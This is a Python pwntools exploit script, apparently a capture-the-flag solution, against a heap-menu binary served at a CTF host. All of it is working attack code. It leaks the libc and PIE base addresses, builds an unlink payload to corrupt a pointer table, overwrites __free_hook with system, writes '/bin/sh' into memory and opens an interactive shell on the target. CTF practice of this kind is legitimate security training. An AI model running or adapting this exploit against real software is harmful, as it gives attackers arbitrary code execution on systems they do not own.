from pwn import *
from time import sleep

period=0.4

def malloc(index,size):
	p.sendline("1")
	p.recvuntil("INDEX? : ")
	#sleep(period)
	p.sendline(str(index))
	p.recvuntil("SIZE? : ")
	#sleep(period)
	p.sendline(str(size))
	p.recvuntil("YOUR CHOICE? : ")
	#sleep(period)
	
def free(index):
	p.sendline("2")
	p.recvuntil("INDEX? : ")
	#sleep(period)
	p.sendline(str(index))
	p.recvuntil("YOUR CHOICE? : ")
	#sleep(period)

def edit(index,data):
	p.sendline("3")
	p.recvuntil("INDEX? : ")
	#sleep(period)
	p.sendline(str(index))
	p.recvuntil("DATA : ")
	#sleep(period)
	p.send(data)
	sleep(0.5)
	p.recvuntil("YOUR CHOICE? : ")
	#sleep(period)


def view(index):
	p.sendline("4")
	p.recvuntil("INDEX? : ")
	#sleep(period)
	p.sendline(str(index))
	p.recvuntil("DATA : ")
	data=p.recvline()
	#sleep(period)
	p.recvuntil("YOUR CHOICE? : ")
	#sleep(period)
	return data

def leak_pie():
	p.sendline("2")
	p.recvuntil("Input your payload : ")
	#sleep(period)
	p.send("AAAABBBBCCCCDDDDFFFFEEEE")
	p.recvuntil("AAAABBBBCCCCDDDDFFFFEEEE")
	data=p.recvline()
	p.recvuntil("YOUR CHOICE? : ")
	#sleep(period)
	return data


#p=process("./errorProgram")
p=remote("error-program.ctf.defenit.kr", 7777)
p.sendline("3")
sleep(period)
print "LEAKING LIBC.."
malloc(0,0x777)
malloc(1,0x777)
free(0)

leak=u64(view(0)[:8])
base=leak-0x3ebca0
system=base+0x000000000004f440
free_hook=base+0x00000000003ed8e8
print "DONE LEAKING LIBC"
#0x20c9000
print "leak :",hex(leak)
print "base :",hex(base)
print "free_hook :",hex(free_hook)
print "LEAKING PIE"
p.sendline("5")
binary_base=u64(leak_pie().strip().ljust(8,"\x00"))-0x1406
stuct_addr=binary_base+0x202060
print "DONE PIE"
print "binary_base :",hex(binary_base)
print "stuct_addr :",hex(stuct_addr)
print "UNLINK ATTACK"
p.sendline("3")
#edit(0,p64(leak)*2+"A"*(0x770-16-0x20)+p64(0)+p64(0x21)+p64(stuct_addr-0x18)+p64(stuct_addr-0x10)+"\x20\x00")
payload=""
payload+=p64(0)
payload+=p64(0x771)
payload+=p64(stuct_addr-0x18)
payload+=p64(stuct_addr-0x10)
payload+=p64(0)
payload+="\x00"*(0x770-32-8)
payload+="\x70\x07\x00\x00\x00\x00\x00"
#sleep(period)
edit(0,payload)
#sleep(period)

free(1)
print "DONE UNLINK"
print "OVERWRITING FREE HOOK"

#sleep(period)
edit(0,p64(0)+p64(0)+p64(0)+p64(stuct_addr-0x18)+p64(free_hook))
#sleep(period)
edit(1,p64(system))
#sleep(period)
print "DONE"
print "WRITING BINSH IN BSS"
edit(0,p64(0)+p64(0)+p64(0)+p64(stuct_addr-0x18)+p64(stuct_addr+0x100))
#sleep(period)
edit(1,"/bin/sh\x00")
#sleep(period)
print "DONE"
print "GETTING SHELL ..."
#edit(0,p64(0)+p64(0)+p64(0)+p64(stuct_addr-0x18)+p64(stuct_addr+0x100))
p.sendline("2")
p.sendline("1")
print "ENJOY !"
#gdb.attach(p.pid)
p.interactive()
